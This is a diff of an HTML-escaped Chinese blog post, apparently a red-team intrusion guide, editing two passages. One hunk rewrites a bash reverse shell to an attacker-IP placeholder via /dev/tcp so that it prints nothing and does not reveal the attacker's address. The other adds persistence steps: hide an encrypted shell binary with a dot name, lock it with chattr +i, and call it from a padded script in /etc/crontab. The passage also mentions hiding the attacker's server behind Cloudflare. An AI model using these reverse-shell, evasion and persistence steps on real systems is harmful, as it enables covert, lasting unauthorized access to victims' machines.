@@ -135,13 +135,13 @@
 &lt;p&gt;但是此处也是有大坑的,能访问国外服务器的目标机器就好办了,直接上就行,但是不能访问国外服务器的目标机器,首先用Cloudflare比较卡,其次用国内的云服务商的则需要实名,而且费用也不低,所以实在没办法就别隐藏了&lt;/p&gt;
 &lt;h4 id=&#34;33-加密bash反弹shell&#34;&gt;3.3 加密bash反弹shell&lt;/h4&gt;
 &lt;p&gt;bash反弹shell:&lt;/p&gt;
-&lt;p&gt;目标机器反弹shell:&lt;/p&gt;
+&lt;p&gt;目标机器反弹shell,不打印输出信息,防止暴露攻击机的ip等:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bash -i &amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/攻击机的ip/攻击机接收shell的端口 0&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bash -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/攻击机的ip/攻击机接收shell的端口 0&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt; &amp;gt;/dev/null 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;攻击机接收反弹来的shell:&lt;/p&gt;
@@ -257,7 +257,7 @@
 &lt;p&gt;切记要做持久化,不然辛辛苦苦拿的shell可能就要重新拿或者没了,方法很多,可以google搜一下,与时俱进,用最新的东西&lt;/p&gt;
 &lt;p&gt;cron计划任务权限维持比较简单,当然也比较明显:&lt;/p&gt;
 &lt;p&gt;建议用前面说的shc加密,上传生成的二进制文件,用这个二进制文件弹shell,安全性高一点&lt;/p&gt;
-&lt;p&gt;上传之后,先&lt;code&gt;chmod +x 二进制文件&lt;/code&gt;给一下权限,然后在名字前面加个&lt;code&gt;.&lt;/code&gt;变为隐藏文件(&lt;code&gt;ls -a&lt;/code&gt;可以查看隐藏文件),再尝试一下&lt;code&gt;chattr +i 二进制文件&lt;/code&gt;(&lt;code&gt;chattr -i 二进制文件&lt;/code&gt;可以解除锁定)防止删除,有相应的权限才能成功执行这条命令,最后把这个文件放在安全又隐秘的位置,&lt;/p&gt;
+&lt;p&gt;上传之后,先&lt;code&gt;chmod +x 二进制文件&lt;/code&gt;给一下权限,然后在名字前面加个&lt;code&gt;.&lt;/code&gt;变为隐藏文件(&lt;code&gt;ls -a&lt;/code&gt;可以查看隐藏文件),再尝试一下&lt;code&gt;chattr +i 二进制文件&lt;/code&gt;(&lt;code&gt;chattr -i 二进制文件&lt;/code&gt;可以解除锁定)防止删除,有相应的权限才能成功执行这条命令,最后把这个文件放在安全又隐秘的位置,然后新建一个bash脚本,里面随便填充点内容,然后把调用这个文件的语句放在里面,最后加在/etc/crontab里&lt;/p&gt;
 &lt;p&gt;配置cron计划任务时,如果是root用户,那就在/etc/crontab里添加,如果不是root用户,那就用&lt;code&gt;crontab -e&lt;/code&gt;添加,注意&lt;code&gt;crontab -e&lt;/code&gt;需要交互式shell,理论上来说非root用户的cron存在/var/spool/crond下(CentOS),可以直接编辑相应的文件,但是非root用户通常没有权限直接编辑,所以还是需要获取交互式shell然后&lt;code&gt;crontab -e&lt;/code&gt;添加&lt;/p&gt;
 &lt;p&gt;/etc/crontab里应该有默认的配置和默认的例子,&lt;code&gt;crontab -e&lt;/code&gt;没有,不管是怎么写cron,都建议使用以下配置:&lt;/p&gt;
 &lt;p&gt;在写cron之前先执行&lt;code&gt;$PATH&lt;/code&gt;查看环境变量并复制,然后再写cron&lt;/p&gt;
